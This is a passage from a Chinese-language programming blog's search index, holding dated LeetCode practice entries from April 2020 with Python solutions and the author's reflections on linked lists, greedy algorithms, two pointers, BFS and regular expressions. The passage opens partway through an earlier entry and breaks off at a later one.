r.append(str(node.val))</span><br><span class="line">            helper(node.left,r)</span><br><span class="line">            helper(node.right,r)</span><br><span class="line">        ans1,ans2=[<span class="string">''</span>],[<span class="string">''</span>]</span><br><span class="line">        helper(t,ans1)</span><br><span class="line">        helper(s,ans2)</span><br><span class="line">        ans1=<span class="string">' '</span>.join(ans1)</span><br><span class="line">        ans2=<span class="string">' '</span>.join(ans2)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span> <span class="keyword">if</span> ans1 <span class="keyword">in</span> ans2 <span class="keyword">else</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure></p><h3 id="官方解（树哈希）"><a href="#官方解（树哈希）" class="headerlink" title="官方解（树哈希）"></a>官方解（树哈希）</h3><p>参考题解：<a href="https://leetcode-cn.com/problems/subtree-of-another-tree/solution/ling-yi-ge-shu-de-zi-shu-by-leetcode-solution/" target="_blank" rel="noopener">另一个树的子树</a></p><blockquote><p>考虑把每个子树都映射成一个唯一的数，如果 t 对应的数字和 s 中任意一个子树映射的数字相等，则 t 是 s 的某一棵子树。</p></blockquote><p>……我有点儿不懂……先马住，慢慢学习（</p>]]></content>
      
      
      <categories>
          
          <category> 算法练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DFS </tag>
            
            <tag> DP </tag>
            
            <tag> 分治 </tag>
            
            <tag> 线段树 </tag>
            
            <tag> 贪心 </tag>
            
            <tag> 树hash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020年4月LeetCode练习</title>
      <link href="/2020/04/03/LeetCode-2020%E5%B9%B44%E6%9C%88/"/>
      <url>/2020/04/03/LeetCode-2020%E5%B9%B44%E6%9C%88/</url>
      
        <content type="html"><![CDATA[<p><excerpt in index | 首页摘要><br>总之就是每天搞一道题。挑一些自我反省来写。<br><a id="more"></a></excerpt></p><p><the rest of contents | 余下全文><br>有时两题，有时零题。<br>我常常因为自己太菜而一道题写半天.jpg</the></p><h2 id="4-2"><a href="#4-2" class="headerlink" title="4.2"></a>4.2</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="https://leetcode-cn.com/problems/add-two-numbers/" target="_blank" rel="noopener">2. 两数相加</a></p><h3 id="很喜欢的解法（哑结点）"><a href="#很喜欢的解法（哑结点）" class="headerlink" title="很喜欢的解法（哑结点）"></a>很喜欢的解法（哑结点）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">addTwoNumbers</span><span class="params">(self, l1: ListNode, l2: ListNode)</span> -&gt; ListNode:</span></span><br><span class="line">        dummyHead = ListNode(<span class="number">0</span>)</span><br><span class="line">        curr, carry = dummyHead, <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> l1 <span class="keyword">or</span> l2:</span><br><span class="line">            sum = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> l1:</span><br><span class="line">                sum += l1.val</span><br><span class="line">                l1 = l1.next</span><br><span class="line">            <span class="keyword">if</span> l2:</span><br><span class="line">                sum += l2.val</span><br><span class="line">                l2 = l2.next</span><br><span class="line">            sum += carry</span><br><span class="line">            carry = sum // <span class="number">10</span></span><br><span class="line">            curr.next = ListNode(sum % <span class="number">10</span>)</span><br><span class="line">            curr = curr.next</span><br><span class="line">        <span class="keyword">if</span> carry &gt; <span class="number">0</span>:</span><br><span class="line">            curr.next = ListNode(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> dummyHead.next;</span><br></pre></td></tr></table></figure><h3 id="自己第一反应的解法"><a href="#自己第一反应的解法" class="headerlink" title="自己第一反应的解法"></a>自己第一反应的解法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">addTwoNumbers</span><span class="params">(self, l1: ListNode, l2: ListNode)</span> -&gt; ListNode:</span></span><br><span class="line">        b=ListNode(<span class="number">0</span>)</span><br><span class="line">        c=b</span><br><span class="line">        <span class="keyword">while</span> l1 <span class="keyword">or</span> l2:</span><br><span class="line">            c.val+=sum(list(map(<span class="keyword">lambda</span> x:<span class="number">0</span> <span class="keyword">if</span> x==<span class="literal">None</span> <span class="keyword">else</span> x.val,[l1,l2])))</span><br><span class="line">            l1,l2=list(map(<span class="keyword">lambda</span> x:x <span class="keyword">if</span> x==<span class="literal">None</span> <span class="keyword">else</span> x.next,[l1,l2]))</span><br><span class="line">            c.next=[ListNode(c.val//<span class="number">10</span>),<span class="literal">None</span>][c.val&lt;<span class="number">10</span> <span class="keyword">and</span> l1==l2==<span class="literal">None</span>]</span><br><span class="line">            c.val%=<span class="number">10</span></span><br><span class="line">            c=c.next</span><br><span class="line">        <span class="keyword">return</span> b</span><br></pre></td></tr></table></figure><h3 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h3><ul><li>发现自己的解法太过耗脑就不要一直莽，想想别的出路。就好像这道题，做一个哑节点会让逻辑和操作都清晰很多。</li><li><code>lambda</code>真的很酷炫，也很容易沉迷……但别瞎用。这东西对于提升运行效率并无助益，平时跑起来感觉不到什么，但其实会很慢。慢到想死。</li><li>多看数据结构，多看数据结构，多看数据结构。</li></ul><h2 id="4-3"><a href="#4-3" class="headerlink" title="4.3"></a>4.3</h2><h3 id="题目链接-1"><a href="#题目链接-1" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="https://leetcode-cn.com/problems/string-to-integer-atoi/" target="_blank" rel="noopener">8. 字符串转换整数 (atoi)</a></p><h3 id="很喜欢的解法（正则）"><a href="#很喜欢的解法（正则）" class="headerlink" title="很喜欢的解法（正则）"></a>很喜欢的解法（正则）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">myAtoi</span><span class="params">(self, str: str)</span> -&gt; int:</span></span><br><span class="line">        <span class="keyword">return</span> max(min(int(*re.findall(<span class="string">'^[\+\-]?\d+'</span>, str.lstrip())), <span class="number">2</span>**<span class="number">31</span> - <span class="number">1</span>), <span class="number">-2</span>**<span class="number">31</span>)</span><br></pre></td></tr></table></figure><h3 id="自己第一反应的解法-1"><a href="#自己第一反应的解法-1" class="headerlink" title="自己第一反应的解法"></a>自己第一反应的解法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">myAtoi</span><span class="params">(self, str: str)</span> -&gt; int:</span></span><br><span class="line">        r=<span class="string">''</span></span><br><span class="line">        l=<span class="string">'0123456789'</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line">            <span class="keyword">if</span> (i==<span class="string">' '</span> <span class="keyword">and</span> r!=<span class="string">''</span>) <span class="keyword">or</span> (i <span class="keyword">not</span> <span class="keyword">in</span> l+<span class="string">'-+ '</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> (i <span class="keyword">in</span> <span class="string">'-+'</span>) <span class="keyword">and</span> (len(r)!=<span class="number">0</span> <span class="keyword">or</span> (<span class="string">'-'</span> <span class="keyword">in</span> r <span class="keyword">or</span> <span class="string">'+'</span> <span class="keyword">in</span> r)):</span><br><span class="line">                <span class="keyword">if</span> len(r)==<span class="number">1</span>:<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">                <span class="keyword">else</span>:<span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> l+<span class="string">'-+'</span>:</span><br><span class="line">                r+=i</span><br><span class="line">        <span class="keyword">if</span> r <span class="keyword">in</span> <span class="string">'-+'</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> max(min(int(r),<span class="number">2</span>**<span class="number">31</span><span class="number">-1</span>),<span class="number">-2</span>**<span class="number">31</span>)</span><br></pre></td></tr></table></figure><h3 id="感想-1"><a href="#感想-1" class="headerlink" title="感想"></a>感想</h3><ul><li>正则可以省很多事，能上正则的时候就尽量上正则。</li><li>不要觉得一个技巧很酷就一直用，要多多依赖自带函数。就好像在这道题里<code>str.lstrip()</code>比遍历判断空格更好用，<code>min(r,2**31-1)</code>比<code>[r,2**31-1][r&gt;=2**31-1]</code>更清晰。虽然用列表来写判断很有趣，但不要遇事不决上列表（……）本道理同样适用于<code>lambda x</code>。</li><li>造测试样例很重要（……）尽可能把所有可能的情况都包含上比较好，想的不够多又相信自己的脑子就会出很多WA和RE（。</li></ul><h2 id="4-17"><a href="#4-17" class="headerlink" title="4.17"></a>4.17</h2><p>隔很多天又去A了一下每日一题（……）<br>要么太难要么太简单，今天正好难度适中动了动脑子（……）</p><h3 id="题目链接-2"><a href="#题目链接-2" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="https://leetcode-cn.com/problems/jump-game/submissions/" target="_blank" rel="noopener">35.跳跃游戏</a></p><h3 id="很喜欢的解法（贪心）"><a href="#很喜欢的解法（贪心）" class="headerlink" title="很喜欢的解法（贪心）"></a>很喜欢的解法（贪心）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">canJump</span><span class="params">(self, nums)</span> :</span></span><br><span class="line">        max_i = <span class="number">0</span>       <span class="comment">#初始化当前能到达最远的位置</span></span><br><span class="line">        <span class="keyword">for</span> i, jump <span class="keyword">in</span> enumerate(nums):   <span class="comment">#i为当前位置，jump是当前位置的跳数</span></span><br><span class="line">            <span class="keyword">if</span> max_i&gt;=i <span class="keyword">and</span> i+jump&gt;max_i:  <span class="comment">#如果当前位置能到达，并且当前位置+跳数&gt;最远位置  </span></span><br><span class="line">                max_i = i+jump  <span class="comment">#更新最远能到达位置</span></span><br><span class="line">        <span class="keyword">return</span> max_i&gt;=i</span><br></pre></td></tr></table></figure><h3 id="自己第一反应的解法-2"><a href="#自己第一反应的解法-2" class="headerlink" title="自己第一反应的解法"></a>自己第一反应的解法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">canJump</span><span class="params">(self, nums: List[int])</span> -&gt; bool:</span></span><br><span class="line">        maxc=nums[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">            <span class="keyword">if</span> i&gt;maxc:<span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> (i+nums[i])&gt;=(len(nums)<span class="number">-1</span>):<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            maxc=max(maxc,nums[i]+i)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><h3 id="感想-2"><a href="#感想-2" class="headerlink" title="感想"></a>感想</h3><ul><li><code>enumerate()</code>是不是比<code>range(len())</code>要快啊！好不安，总之度了一下，大家说尽量用<code>enumerate</code>取代掉<code>range</code>，那就这样叭（</li><li>想了想其实初始值直接<code>maxc=0</code>就好了（……）不过这样子赋值也没什么影响，大概。</li></ul><h2 id="4-18"><a href="#4-18" class="headerlink" title="4.18"></a>4.18</h2><h3 id="题目链接-3"><a href="#题目链接-3" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="https://leetcode-cn.com/problems/container-with-most-water/" target="_blank" rel="noopener">11. 盛最多水的容器</a></p><h3 id="自己暴力开冲超时以后的修改解法（双指针）"><a href="#自己暴力开冲超时以后的修改解法（双指针）" class="headerlink" title="自己暴力开冲超时以后的修改解法（双指针）"></a>自己暴力开冲超时以后的修改解法（双指针）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxArea</span><span class="params">(self, height: List[int])</span> -&gt; int:</span></span><br><span class="line">        maxm=<span class="number">0</span></span><br><span class="line">        i,j=<span class="number">0</span>,len(height)<span class="number">-1</span></span><br><span class="line">        <span class="keyword">while</span> i!=j:</span><br><span class="line">            maxm=max(maxm,(j-i)*min(height[i],height[j]))</span><br><span class="line">            <span class="keyword">if</span> height[i]&lt;height[j]:</span><br><span class="line">                i+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                j-=<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> maxm</span><br></pre></td></tr></table></figure><h3 id="感想-3"><a href="#感想-3" class="headerlink" title="感想"></a>感想</h3><ul><li>关于解法的说明：尝试过程中矩形底边必定不断变小，而矩形的高又是<code>min(height[i],height[j])</code>，所以只能通过改变min值来增加矩形面积，亦即改变这两个值中的较小值……也就是较矮一端的柱子。<br>视频：<a href="https://leetcode-cn.com/problems/container-with-most-water/solution/shuang-zhi-zhen-fa-zheng-ming-jian-dan-yi-dong-bu-/" target="_blank" rel="noopener">【双指针法】的合理性证明 - LeetCode</a></li><li>后来去看了看题解，在判断那里可以再加一下。如果下一个位置比现在的位置数值还要小，可以直接跳过，免得重复计算面积（……）天才吗（</li></ul><h2 id="4-19"><a href="#4-19" class="headerlink" title="4.19"></a>4.19</h2><h3 id="题目链接-4"><a href="#题目链接-4" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="https://leetcode-cn.com/problems/reformat-the-string/" target="_blank" rel="noopener">5388. 重新格式化字符串</a></p><h3 id="很喜欢的解法"><a href="#很喜欢的解法" class="headerlink" title="很喜欢的解法"></a>很喜欢的解法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reformat</span><span class="params">(self, s: str)</span> -&gt; str:</span></span><br><span class="line">        a=re.findall(<span class="string">r'\d'</span>,s)</span><br><span class="line">        b=re.findall(<span class="string">r'[a-z]'</span>,s)</span><br><span class="line">        <span class="keyword">if</span> abs(len(a)-len(b))&gt;<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">        a,b=sorted([a,b],key=len)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join(map(<span class="string">''</span>.join,itertools.zip_longest(b,a,fillvalue=<span class="string">''</span>)))</span><br></pre></td></tr></table></figure><h3 id="自己第一反应的解法-3"><a href="#自己第一反应的解法-3" class="headerlink" title="自己第一反应的解法"></a>自己第一反应的解法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reformat</span><span class="params">(self, s: str)</span> -&gt; str:</span></span><br><span class="line">        a=re.findall(<span class="string">'[a-z]'</span>,s)</span><br><span class="line">        b=re.findall(<span class="string">'[0-9]'</span>,s)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">-1</span>&lt;=(len(a)-len(b))&lt;=<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">""</span></span><br><span class="line">        <span class="keyword">if</span> len(b)&gt;len(a):a,b=b,a</span><br><span class="line">        c=<span class="string">''</span>.join([y <span class="keyword">for</span> x <span class="keyword">in</span> zip(a,b) <span class="keyword">for</span> y <span class="keyword">in</span> x])</span><br><span class="line">        <span class="keyword">if</span> len(a)!=len(b):c+=a[<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">return</span> c</span><br></pre></td></tr></table></figure><h3 id="感想-4"><a href="#感想-4" class="headerlink" title="感想"></a>感想</h3><ul><li>是我读的函数太少，是我太菜，我根本没掌握<code>map</code>的正确用法，下次一定写<code>abs</code>和<code>sorted</code>，dbq，dbq</li></ul><h2 id="4-20"><a href="#4-20" class="headerlink" title="4.20"></a>4.20</h2><h3 id="题目链接-5"><a href="#题目链接-5" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="https://leetcode-cn.com/problems/contains-duplicate-ii/" target="_blank" rel="noopener">219. 存在重复元素 II</a></p><h3 id="很喜欢的解法（HashSet）"><a href="#很喜欢的解法（HashSet）" class="headerlink" title="很喜欢的解法（HashSet）"></a>很喜欢的解法（HashSet）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">containsNearbyDuplicate</span><span class="params">(self, nums: List[int], k: int)</span> -&gt; bool:</span></span><br><span class="line">        tmp=set()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">            <span class="keyword">if</span> nums[i] <span class="keyword">in</span> tmp:<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            tmp.add(nums[i])</span><br><span class="line">            <span class="keyword">if</span> len(tmp)&gt;k:</span><br><span class="line">                tmp.remove(nums[i-k])</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><h3 id="自己安定超时的第一反应"><a href="#自己安定超时的第一反应" class="headerlink" title="自己安定超时的第一反应"></a>自己安定超时的第一反应</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">containsNearbyDuplicate</span><span class="params">(self, nums: List[int], k: int)</span> -&gt; bool:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">                <span class="keyword">if</span> j!=i <span class="keyword">and</span> nums[j]==nums[i] <span class="keyword">and</span> -k&lt;=(i-j)&lt;=k:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><h3 id="感想-5"><a href="#感想-5" class="headerlink" title="感想"></a>感想</h3><ul><li>暴力不可取，停止套娃。</li><li>能搞懂各种数据结构的应用场合是快乐做题的关键一步（？）</li></ul><h3 id="题目链接-6"><a href="#题目链接-6" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="https://leetcode-cn.com/problems/number-of-islands/" target="_blank" rel="noopener">200. 岛屿数量</a></p><h3 id="看了题解的解法（BFS）"><a href="#看了题解的解法（BFS）" class="headerlink" title="看了题解的解法（BFS）"></a>看了题解的解法（BFS）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">numIslands</span><span class="params">(self, grid: List[List[str]])</span> -&gt; int:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">bfs</span><span class="params">(grid,i,j)</span>:</span></span><br><span class="line">            <span class="keyword">if</span> i&lt;<span class="number">0</span> <span class="keyword">or</span> j&lt;<span class="number">0</span> <span class="keyword">or</span> i&gt;=len(grid) <span class="keyword">or</span> j&gt;=len(grid[<span class="number">0</span>]) <span class="keyword">or</span> grid[i][j]!=<span class="string">'1'</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            grid[i][j]=<span class="number">0</span></span><br><span class="line">            bfs(grid,i,j<span class="number">-1</span>)</span><br><span class="line">            bfs(grid,i,j+<span class="number">1</span>)</span><br><span class="line">            bfs(grid,i<span class="number">-1</span>,j)</span><br><span class="line">            bfs(grid,i+<span class="number">1</span>,j)</span><br><span class="line"></span><br><span class="line">        count=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(grid)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(grid[<span class="number">0</span>])):</span><br><span class="line">                <span class="keyword">if</span> grid[i][j]==<span class="string">'1'</span>:</span><br><span class="line">                    bfs(grid,i,j)</span><br><span class="line">                    count+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> count</span><br></pre></td></tr></table></figure><h3 id="感想-6"><a href="#感想-6" class="headerlink" title="感想"></a>感想</h3><ul><li>知道“有这么个东西”和“能把概念和实际情景联系上”，差别真的很大（……）我的数据结构学得仿佛白瞎（。总之还是要多练，任重道远（</li></ul><h2 id="4-21"><a href="#4-21" class="headerlink" title="4.21"></a>4.21</h2><h3 id="题目链接-7"><a href="#题目链接-7" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="https://leetcode-cn.com/problems/count-number-of-nice-subarrays/" target="_blank" rel="noopener">1248. 统计「优美子数组」</a></p><h3 id="看了题解的解法"><a href="#看了题解的解法" class="headerlink" title="看了题解的解法"></a>看了题解的解法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">numberOfSubarrays</span><span class="params">(self, nums: List[int], k: int)</span> -&gt; int:</span></span><br><span class="line">        tmp=[i <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)) <span class="keyword">if</span> nums[i]%<span class="number">2</span>!=<span class="number">0</span>]</span><br><span class="line">        tmp=[<span class="number">-1</span>]+tmp+[len(nums)]</span><br><span class="line">        count=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(tmp)-k):</span><br><span class="line">            count+=(tmp[i]-tmp[i<span class="number">-1</span>])*(tmp[i+k]-tmp[i+k<span class="number">-1</span>])</span><br><span class="line">        <span class="keyword">return</span> count</span><br></pre></td></tr></table></figure><h3 id="感想-7"><a href="#感想-7" class="headerlink" title="感想"></a>感想</h3><ul><li>把列表边界处理下会快乐很多，就像之前那道题的哑结点。我怎么不长教训的（笑）</li></ul><h2 id="4-22"><a href="#4-22" class="headerlink" title="4.22"></a>4.22</h2><h3 id="题目链接-8"><a href="#题目链接-8" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="https://leetcode-cn.com/problems/binary-tree-right-side-view/" target="_blank" rel="noopener">199. 二叉树的右视图</a></p><h3 id="很喜欢的解法（BFS）"><a href="#很喜欢的解法（BFS）" class="headerlink" title="很喜欢的解法（BFS）"></a>很喜欢的解法（BFS）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">rightSideView</span><span class="params">(self, root: TreeNode)</span> -&gt; List[int]:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        ans, nodes = [], [root]</span><br><span class="line">        <span class="keyword">while</span> nodes:</span><br><span class="line">            ans.append(nodes[<span class="number">-1</span>].val)</span><br><span class="line">            nodes = [n <span class="keyword">for</span> node <span class="keyword">in</span> nodes <span class="keyword">for</span> n <span class="keyword">in</span> [node.left, node.right] <span class="keyword">if</span> n]</span><br><span class="line">        <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure><h3 id="自己第一反应的解法-4"><a href="#自己第一反应的解法-4" class="headerlink" title="自己第一反应的解法"></a>自己第一反应的解法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 很憨憨的层序遍历</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">rightSideView</span><span class="params">(self, root: TreeNode)</span> -&gt; List[int]:</span></span><br><span class="line">        <span class="keyword">if</span> root==<span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        tmp,level=[root],[]</span><br><span class="line">        result=[]</span><br><span class="line">        nowlist=<span class="number">1</span></span><br><span class="line">        nextlist=<span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> tmp:</span><br><span class="line">            node=tmp.pop(<span class="number">0</span>)</span><br><span class="line">            nowlist-=<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> node.left!=<span class="literal">None</span>:</span><br><span class="line">                tmp+=[node.left]</span><br><span class="line">                nextlist+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> node.right!=<span class="literal">None</span>:</span><br><span class="line">                tmp+=[node.right]</span><br><span class="line">                nextlist+=<span class="number">1</span></span><br><span class="line">            level.append(node.val)</span><br><span class="line">            <span class="keyword">if</span> nowlist==<span class="number">0</span>:</span><br><span class="line">                nowlist,nextlist=nextlist,<span class="number">0</span></span><br><span class="line">                result.append(level[<span class="number">-1</span>])</span><br><span class="line">                level=[]</span><br><span class="line">        <span class="keyword">return</span> list(filter(<span class="literal">None</span>,result))</span><br></pre></td></tr></table></figure><h3 id="感想-8"><a href="#感想-8" class="headerlink" title="感想"></a>感想</h3><ul><li>我会个p的bfs和dfs……dbq我又在拿python写c，我是憨憨，笨蛋是我我是笨蛋。</li><li>既然有语法糖就去吃（。</li></ul><h2 id="4-25"><a href="#4-25" class="headerlink" title="4.25"></a>4.25</h2><h3 id="题目链接-9"><a href="#题目链接-9" class="headerlink" title="题目链接"></a>题目链接</h3><p><a 